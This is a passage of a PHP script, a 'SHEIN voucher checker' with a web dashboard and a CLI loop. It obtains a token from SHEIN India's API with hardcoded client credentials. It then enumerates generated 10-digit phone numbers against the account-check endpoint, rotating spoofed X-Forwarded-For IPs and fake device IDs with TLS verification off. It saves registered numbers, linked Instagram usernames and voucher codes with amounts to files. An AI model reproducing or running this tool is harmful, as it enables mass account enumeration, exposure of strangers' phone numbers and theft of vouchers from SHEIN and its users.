                    </div>
                    <div class="table-scroll">
                        <table id="receivedTable">
                            <thead>
                                <tr><th>Time</th><th>Number</th><th>Status</th><th>Voucher</th><th>Amount</th></tr>
                            </thead>
                            <tbody>
                                <?php foreach ($receivedLog as $entry): 
                                    $statusClass = '';
                                    if ($entry['status'] == 'success') $statusClass = 'success';
                                    elseif ($entry['status'] == 'not_registered') $statusClass = 'error';
                                    elseif ($entry['status'] == 'retry') $statusClass = 'warning';
                                    else $statusClass = 'info';
                                    
                                    $statusText = '';
                                    if ($entry['status'] == 'success') $statusText = '✅ VOUCHER FOUND';
                                    elseif ($entry['status'] == 'not_registered') $statusText = '❌ NOT REGISTERED';
                                    elseif ($entry['status'] == 'registered') $statusText = '📱 REGISTERED';
                                    elseif ($entry['status'] == 'token_obtained') $statusText = '🔑 TOKEN OK';
                                    elseif ($entry['status'] == 'retry') $statusText = '🔄 RETRY (' . ($entry['retryCount'] ?? 1) . '/' . MAX_RETRIES . ')';
                                    else $statusText = '⚠ ' . strtoupper($entry['status'] ?? '');
                                ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($entry['time'] ?? ''); ?></td>
                                    <td><strong><?php echo htmlspecialchars($entry['number'] ?? ''); ?></strong></td>
                                    <td><span class="status-text <?php echo $statusClass; ?>"><?php echo $statusText; ?></span></td>
                                    <td><?php echo htmlspecialchars($entry['voucher'] ?? '-'); ?></td>
                                    <td><?php echo isset($entry['amount']) ? '₹' . htmlspecialchars($entry['amount']) : '-'; ?></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php if (empty($receivedLog)): ?>
                                <tr><td colspan="5" style="text-align: center;">No data yet</td></tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            
            <!-- Recent Vouchers -->
            <div class="vouchers-section" id="vouchersSection">
                <h3 style="margin-bottom: 15px; color: #4a5568;">🎟 Recent Vouchers Found</h3>
                <div id="vouchersList">
                    <?php if (!empty($vouchers)): ?>
                        <?php foreach ($vouchers as $voucher): ?>
                        <div class="voucher-item">
                            <span class="voucher-badge">VOUCHER</span>
                            <div class="voucher-details">
                                <strong><?php echo htmlspecialchars($voucher['number']); ?></strong>
                                <div class="meta">
                                    Instagram: @<?php echo htmlspecialchars($voucher['username'] ?? 'N/A'); ?> | 
                                    Expires: <?php echo htmlspecialchars($voucher['expiry'] ?? 'N/A'); ?>
                                </div>
                            </div>
                            <div style="text-align: right;">
                                <span class="voucher-code"><?php echo htmlspecialchars($voucher['voucher'] ?? 'N/A'); ?></span>
                                <div style="font-weight: bold; color: #48bb78; margin-top: 5px;">₹<?php echo htmlspecialchars($voucher['amount'] ?? '0'); ?></div>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <p style="color: #718096; text-align: center;">No vouchers found yet</p>
                    <?php endif; ?>
                </div>
            </div>
            
            <!-- Log Files -->
            <div style="background: white; border-radius: 12px; padding: 15px; margin-top: 20px;">
                <h4 style="color: #4a5568; margin-bottom: 10px;">📁 Saved Files</h4>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <?php
                    $files = ['registered_numbers.txt', 'registered_numbers.json', 'voucher_numbers.txt', 'voucher_numbers.json', 'all_results.json', 'checked_numbers.json'];
                    foreach ($files as $file):
                        if (file_exists($file)):
                    ?>
                    <a href="<?php echo $file; ?>" target="_blank" style="background: #edf2f7; padding: 5px 12px; border-radius: 20px; font-size: 13px; color: #4a5568; text-decoration: none;">
                        📄 <?php echo $file; ?>
                    </a>
                    <?php
                        endif;
                    endforeach;
                    ?>
                </div>
            </div>
        </div>
        
        <?php if ($isRunning): ?>
        <script>
            // Auto-update every 2 seconds when checker is running
            let updateInterval = setInterval(updateData, 2000);
            
            function updateData() {
                fetch('?ajax=process')
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) {
                            console.error('Error:', data.error);
                            return;
                        }
                        
                        // Update stats
                        document.getElementById('stat-total').textContent = data.stats.total.toLocaleString();
                        document.getElementById('stat-not-registered').textContent = data.stats.not_registered.toLocaleString();
                        document.getElementById('stat-registered').textContent = data.stats.registered.toLocaleString();
                        document.getElementById('stat-vouchers').textContent = data.stats.vouchers.toLocaleString();
                        document.getElementById('stat-retries').textContent = data.stats.retries.toLocaleString();
                        
                        // Update sent table
                        updateSentTable(data.sent_log);
                        
                        // Update received table
                        updateReceivedTable(data.received_log);
                        
                        // Update vouchers
                        updateVouchers(data.vouchers);
                    })
                    .catch(error => console.error('Fetch error:', error));
            }
            
            function updateSentTable(sentLog) {
                const tbody = document.querySelector('#sentTable tbody');
                if (!tbody) return;
                
                let html = '';
                if (sentLog && sentLog.length > 0) {
                    sentLog.forEach(entry => {
                        html += `<tr>
                            <td>${escapeHtml(entry.time || '')}</td>
                            <td><strong>${escapeHtml(entry.number || '')}</strong></td>
                            <td><span class="status-text info">${escapeHtml(entry.step || '')}</span></td>
                            <td>${escapeHtml(entry.ip || '')}</td>
                            <td>${escapeHtml(entry.data || '')}</td>
                        </tr>`;
                    });
                } else {
                    html = '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
                }
                tbody.innerHTML = html;
            }
            
            function updateReceivedTable(receivedLog) {
                const tbody = document.querySelector('#receivedTable tbody');
                if (!tbody) return;
                
                let html = '';
                if (receivedLog && receivedLog.length > 0) {
                    receivedLog.forEach(entry => {
                        let statusClass = '';
                        let statusText = '';
                        
                        if (entry.status == 'success') {
                            statusClass = 'success';
                            statusText = '✅ VOUCHER FOUND';
                        } else if (entry.status == 'not_registered') {
                            statusClass = 'error';
                            statusText = '❌ NOT REGISTERED';
                        } else if (entry.status == 'registered') {
                            statusClass = 'info';
                            statusText = '📱 REGISTERED';
                        } else if (entry.status == 'token_obtained') {
                            statusClass = 'info';
                            statusText = '🔑 TOKEN OK';
                        } else if (entry.status == 'retry') {
                            statusClass = 'warning';
                            statusText = `🔄 RETRY (${entry.retryCount || 1}/${MAX_RETRIES})`;
                        } else {
                            statusClass = 'info';
                            statusText = '⚠ ' + (entry.status || '').toUpperCase();
                        }
                        
                        html += `<tr>
                            <td>${escapeHtml(entry.time || '')}</td>
                            <td><strong>${escapeHtml(entry.number || '')}</strong></td>
                            <td><span class="status-text ${statusClass}">${statusText}</span></td>
                            <td>${escapeHtml(entry.voucher || '-')}</td>
                            <td>${entry.amount ? '₹' + escapeHtml(entry.amount) : '-'}</td>
                        </tr>`;
                    });
                } else {
                    html = '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
                }
                tbody.innerHTML = html;
            }
            
            function updateVouchers(vouchers) {
                const vouchersList = document.getElementById('vouchersList');
                if (!vouchersList) return;
                
                if (vouchers && vouchers.length > 0) {
                    let html = '';
                    vouchers.forEach(voucher => {
                        html += `<div class="voucher-item">
                            <span class="voucher-badge">VOUCHER</span>
                            <div class="voucher-details">
                                <strong>${escapeHtml(voucher.number)}</strong>
                                <div class="meta">
                                    Instagram: @${escapeHtml(voucher.username || 'N/A')} | 
                                    Expires: ${escapeHtml(voucher.expiry || 'N/A')}
                                </div>
                            </div>
                            <div style="text-align: right;">
                                <span class="voucher-code">${escapeHtml(voucher.voucher || 'N/A')}</span>
                                <div style="font-weight: bold; color: #48bb78; margin-top: 5px;">₹${escapeHtml(voucher.amount || '0')}</div>
                            </div>
                        </div>`;
                    });
                    vouchersList.innerHTML = html;
                }
            }
            
            function escapeHtml(unsafe) {
                if (!unsafe) return '';
                return unsafe
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;")
                    .replace(/'/g, "&#039;");
            }
            
            // Handle page unload - stop checking when user leaves
            window.addEventListener('beforeunload', function() {
                clearInterval(updateInterval);
            });
        </script>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================================
// CLI MODE - Original functionality preserved
// ============================================================================
if ($isCli) {
    loadCheckedNumbers();
    loadRetryQueue();

    clearScreen();
    echo COLOR_BOLD . COLOR_CYAN . "╔════════════════════════════════════════════════════════════════════════════════════════════════════╗\n";
    echo "║                    SHEIN VOUCHER CHECKER - RETRY ONLY REAL ERRORS                         ║\n";
    echo "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝\n" . COLOR_RESET . "\n";

    if (!empty($retryQueue)) {
        echo COLOR_YELLOW . "⚠ Found " . count($retryQueue) . " pending retries from previous session (REAL ERRORS only)\n" . COLOR_RESET;
        echo COLOR_YELLOW . "⚠ These will be processed first\n\n" . COLOR_RESET;
    }

    echo COLOR_BOLD . "Enter Base Number (any length, will be completed to 10 digits): " . COLOR_RESET;
    $input = trim(fgets(STDIN));
    $baseNumber = preg_replace('/[^0-9]/', '', $input);
    $baseLength = strlen($baseNumber);

    if ($baseLength == 0) {
        die("Please enter at least one digit\n");
    }

    if ($baseLength > 10) {
        $baseNumber = substr($baseNumber, 0, 10);
        echo COLOR_YELLOW . "⚠ Number truncated to 10 digits: {$baseNumber}\n" . COLOR_RESET;
    }

    echo "\n" . COLOR_GREEN . "✓ Starting voucher checker with base: {$baseNumber}" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Numbers will be completed to 10 digits" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Sending requests ONE BY ONE with 200ms delay" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Registered numbers will be SAVED to files" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Voucher numbers will be SAVED to files" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ 'Not Registered' is NOT an error - will NOT be retried" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Only REAL ERRORS (timeouts, 5xx, empty responses) will be retried up to " . MAX_RETRIES . " times" . COLOR_RESET . "\n\n";

    // Get access token first
    echo "⏳ Obtaining access token... ";
    $ip = randIp();
    $adId = genDeviceId();
    $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
    $headers = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Android",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];

    $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    $response = httpCall($url, $data, $headers, "POST", 0);
    $j = json_decode($response['content'], true);
    $access_token = $j['access_token'] ?? null;

    if (!$access_token) {
        die(COLOR_RED . "\n✗ Error generating token\n" . COLOR_RESET);
    }

    echo COLOR_GREEN . "✓ Success!\n\n" . COLOR_RESET;
    sleep(1);

    // Initialize display manager and response handler
    $displayManager = new DisplayManager();
    $responseHandler = new AsyncResponseHandler();
    $displayManager->render();

    $numberCount = 0;

    // Main processing loop
    while (true) {
        // First, process any pending retries (REAL ERRORS only)
        if (!empty($retryQueue)) {
            processRetryQueue($responseHandler, $displayManager, $access_token);
        }
        
        // Generate new unique number
        $attempts = 0;
        $maxAttempts = 100;
        
        do {
            $completeNumber = generateCompleteNumber($baseNumber);
            $attempts++;
            if ($attempts > $maxAttempts) {
                echo COLOR_RED . "⚠ Could not generate enough unique numbers. Exiting.\n" . COLOR_RESET;
                break 2;
            }
        } while (isset($checkedNumbers[$completeNumber]));
        
        $numberCount++;
        
        // Prepare request
        $ip = randIp();
        $adId = genDeviceId();
        
        // Log sent request
        $displayManager->addSent($completeNumber, 'account_check', $ip, "mobile=$completeNumber");
        
        // Create cURL handle for account check
        $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
        $headers = [
            "Authorization: Bearer $access_token",
            "Requestid: account_check",
            "X-Tenant: B2C",
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Forwarded-For: $ip"
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => "mobileNumber=$completeNumber",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 15
        ]);
        
        // Add to response handler
        $responseHandler->addRequest($completeNumber, $ch, $completeNumber, 'account_check', $ip, "mobile=$completeNumber", 0);
        
        // Check for any pending responses
        $responseHandler->checkResponses($displayManager, $access_token);
        
        // Delay 200ms before next request
        usleep(200000);
        
        // Every 10 requests, give a longer pause and process retries
        if ($numberCount % 10 == 0) {
            echo COLOR_YELLOW . "⏸ Small pause after 10 requests... checking responses and retries\n" . COLOR_RESET;
            for ($i = 0; $i < 5; $i++) {
                $responseHandler->checkResponses($displayManager, $access_token);
                processRetryQueue($responseHandler, $displayManager, $access_token);
                usleep(50000);
            }
        }
    }

    // Handle Ctrl+C gracefully
    if (function_exists('pcntl_signal')) {
        pcntl_signal(SIGINT, function() use ($displayManager) {
            echo "\n\n" . COLOR_BOLD . COLOR_YELLOW . "🛑 Script stopped by user" . COLOR_RESET . "\n";
            echo COLOR_BOLD . "📊 Final Stats - Total Vouchers Found: " . COLOR_GREEN . $displayManager->stats['vouchers'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "📱 Total Numbers Processed: " . COLOR_GREEN . $displayManager->stats['total_processed'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "❌ Not Registered: " . COLOR_RED . $displayManager->stats['not_registered'] . COLOR_RESET . " (NOT retried)" . "\n";
            echo COLOR_BOLD . "📱 Registered: " . COLOR_BLUE . $displayManager->stats['registered'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "🔄 Real Error Retries: " . COLOR_YELLOW . $displayManager->stats['retries'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "⚠ Final Errors: " . COLOR_RED . $displayManager->stats['errors'] . COLOR_RESET . "\n\n";
            
            displaySavedStats();
            
            $csvFile = exportToCSV();
            if ($csvFile) {
                echo COLOR_GREEN . "\n✅ Exported all vouchers to: " . $csvFile . COLOR_RESET . "\n\n";
            }
            
            exit;
        });
    }
}
?>
